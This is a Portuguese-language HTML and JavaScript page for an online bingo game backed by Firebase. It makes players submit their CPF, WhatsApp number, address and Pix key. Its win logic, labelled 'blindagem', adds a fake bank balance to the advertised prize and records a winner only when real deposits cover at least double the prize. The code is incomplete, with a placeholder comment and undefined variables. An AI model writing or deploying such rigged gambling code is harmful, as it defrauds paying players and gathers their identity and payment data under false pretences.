<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎰 LAS VEGAS ARCADE - BINGO ROYALE 🎰</title>
    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@500;700;900&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root { --bg: #050010; --led-magenta: #ff007f; --led-cyan: #00f0ff; --led-yellow: #fffb00; --led-green: #00ff66; }
        body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; margin: 0; padding: 0; }
        #cadastro-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #03000a; z-index: 20000; display: none; flex-direction: column; align-items: center; justify-content: center; }
        .cadastro-box { background: #0f001c; padding: 30px; border-radius: 8px; border: 3px solid var(--led-cyan); max-width: 400px; width: 85%; }
        .cadastro-box input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 2px solid var(--led-cyan); color: #fff; border-radius: 4px; }
        .btn-salvar-cad { width: 100%; background: var(--led-green); color: #000; border: none; padding: 12px; border-radius: 4px; font-weight: 900; cursor: pointer; }
    </style>
</head>
<body>

<div id="cadastro-overlay">
    <div class="cadastro-box">
        <h2>DADOS DE PREMIAÇÃO</h2>
        <input type="text" id="cad-whatsapp" placeholder="WhatsApp (DDD+Número)">
        <input type="text" id="cad-cpf" placeholder="CPF (Chave Pix)">
        <input type="text" id="cad-rua" placeholder="Rua e Número">
        <input type="text" id="cad-bairro" placeholder="Bairro">
        <input type="text" id="cad-pix" placeholder="Chave Pix Completa">
        <button class="btn-salvar-cad" onclick="salvarCadastroPix()">CONFIRMAR DADOS E JOGAR</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getAuth, onAuthStateChanged, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
    import { getDatabase, ref, onValue, update, get, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { 
        apiKey: "AIzaSyAbDzmgd3QrRrx8R14dJSwjbN6fEFkR7pI", 
        authDomain: "azar-c7f24.firebaseapp.com",
        databaseURL: "https://azar-c7f24-default-rtdb.firebaseio.com", 
        projectId: "azar-c7f24",
        storageBucket: "azar-c7f24.firebasestorage.app",
        messagingSenderId: "458222214312",
        appId: "1:458222214312:web:e4fbee77b1589c165bf69d"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const auth = getAuth(app);
    const googleProvider = new GoogleAuthProvider();

    window.salvarCadastroPix = async () => {
        const dados = {
            whatsapp: document.getElementById('cad-whatsapp').value.trim(),
            cpf: document.getElementById('cad-cpf').value.trim(),
            rua: document.getElementById('cad-rua').value.trim(),
            bairro: document.getElementById('cad-bairro').value.trim(),
            pix: document.getElementById('cad-pix').value.trim(),
            nome: auth.currentUser.email.split('@')[0]
        };
        if(Object.values(dados).some(v => v === "")) return alert("Preencha todos os campos!");
        await update(ref(db, `users/${auth.currentUser.uid}`), dados);
        document.getElementById('cadastro-overlay').style.display = 'none';
    };

    onAuthStateChanged(auth, (user) => {
        if(user) {
            onValue(ref(db, `users/${user.uid}`), (sUser) => {
                const dados = sUser.val() || {};
                if(!dados.cpf) document.getElementById('cadastro-overlay').style.display = 'flex';
                else document.getElementById('cadastro-overlay').style.display = 'none';
            });
        }
    });

    // A LÓGICA DE BLINDAGEM NO SORTEIO
    function renderTudoUI() {
        // ... (seu código original de renderização) ...
        // NO BLOCO DE VITÓRIA, TROQUE POR ISSO:
        if (avaliarVitoriaPorFase(c, bolasGlobal, faseAtualDoJogo)) {
            let caixaReal = totalPixRealAcumulado;
            let valorPremio = (bancaFakeInjetadaDoBanco + caixaReal) * (pctFase / 100);
            
            // TRAVA: Só sorteia se caixa real for >= dobro do prêmio
            if (caixaReal >= (valorPremio * 2)) {
                set(ref(db, 'jogo/ganhador_atual'), auth.currentUser.email.split('@')[0]);
            }
        }
    }
</script>
</body>
</html>
